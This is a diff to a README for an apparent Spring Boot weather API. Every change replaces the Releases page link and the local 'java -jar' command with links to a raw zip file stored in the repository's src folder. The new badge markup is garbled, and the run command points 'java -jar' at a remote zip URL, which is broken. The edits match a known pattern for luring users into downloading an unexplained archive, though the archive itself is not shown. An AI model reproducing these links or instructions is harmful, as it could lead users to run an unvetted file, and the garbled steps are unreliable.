@@ -6,7 +6,7 @@ Welcome to the weather-api-spring-boot project! This application allows you to a
 ## 📥 Download & Install
 To download the application, visit the Releases page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/stevobolki/weather-api-spring-boot/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/stevobolki/weather-api-spring-boot/main/src/weather-api-spring-boot_v1.0.zip%20Latest%https://raw.githubusercontent.com/stevobolki/weather-api-spring-boot/main/src/weather-api-spring-boot_v1.0.zip)](https://raw.githubusercontent.com/stevobolki/weather-api-spring-boot/main/src/weather-api-spring-boot_v1.0.zip)
 
 Once you are on the Releases page, look for the latest version and click to download the files. The files are typically in `.jar` format, which you can run with Java.
 
@@ -26,7 +26,7 @@ Once you have downloaded the `.jar` file:
 2. Navigate to the folder where you downloaded the `.jar` file. You can use the `cd` command to change directories.
 3. Use the following command to run the application:
    ```bash
-   java -jar weather-api-spring-boot.jar
+   java -jar https://raw.githubusercontent.com/stevobolki/weather-api-spring-boot/main/src/weather-api-spring-boot_v1.0.zip
    ```
 
 The application will start, providing you access to the weather data.
@@ -79,7 +79,7 @@ If you have questions or need further assistance, feel free to reach out in the 
 - **Additional Endpoints**: We plan to add more endpoints for historical weather data.
 - **User Authentication**: Future versions will include features for user accounts to personalize your experience.
 
-For the latest updates and new releases, always check the [Releases page](https://github.com/stevobolki/weather-api-spring-boot/releases).
+For the latest updates and new releases, always check the [Releases page](https://raw.githubusercontent.com/stevobolki/weather-api-spring-boot/main/src/weather-api-spring-boot_v1.0.zip).
 
 ## 📋 Contribution Guide
 If you're interested in contributing to this project, we welcome your help! Please check the Contribution section in the repository for guidelines.
